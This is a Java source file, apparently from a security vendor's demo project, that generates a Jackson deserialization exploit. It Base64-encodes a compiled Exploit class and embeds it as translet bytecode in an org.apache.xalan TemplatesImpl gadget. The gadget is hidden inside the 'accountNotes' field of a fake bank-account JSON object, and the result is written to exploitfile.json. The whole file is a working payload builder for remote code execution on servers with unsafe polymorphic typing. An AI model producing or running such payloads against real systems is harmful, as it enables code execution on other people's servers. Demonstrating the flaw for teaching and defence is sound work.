package com.contrastsecurity.demo.jacksondemo;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Base64;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

public class EncodeExploit {
  public static void main(String[] args) throws Exception {

    Path path = Paths.get("target/classes/com/contrastsecurity/demo/jacksondemo/Exploit.class");
    byte[] classBytes = Files.readAllBytes(path);
    byte[] encodedBytes = Base64.getEncoder().encode(classBytes);

    System.out.println("Crafted Exploit (Encoded) :");
    System.out.println(new String(encodedBytes));

    JSONObject craftObject = new JSONObject();

    craftObject.put("customerName", "evilUser");
    craftObject.put("accountType", "checking");
    craftObject.put("accountNumber", getRandAlphaNumeric(20));
    craftObject.put("balance", 10000);

    JSONArray craftList = new JSONArray();
    craftList.add("org.apache.xalan.xsltc.trax.TemplatesImpl");

    JSONObject transletObject = new JSONObject();

    JSONArray transletArray = new JSONArray();
    transletArray.add(new String(encodedBytes));

    transletObject.put("transletBytecodes",transletArray);
    transletObject.put("transletName", "businessObject");
    transletObject.put("outputProperties", new JSONObject());

    craftList.add(transletObject);

    craftObject.put("accountNotes", craftList);

    System.out.println("Crafted JSON (with embedded bytes) :");
    System.out.println(craftObject.toJSONString());

    try (FileWriter file = new FileWriter("./exploitfile.json")) {
      file.write(craftObject.toJSONString());
      file.flush();

    } catch (IOException e) {
      System.out.println("Failed to write file");
      e.printStackTrace();
    }

  }

  private static String getRandAlphaNumeric(int len) {
    char[] ch = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();
    char[] c = new char[len];
    SecureRandom random = new SecureRandom();
    for (int i = 0; i < len; i++) {
      c[i] = ch[random.nextInt(ch.length)];
    }
    return new String(c);
  }
}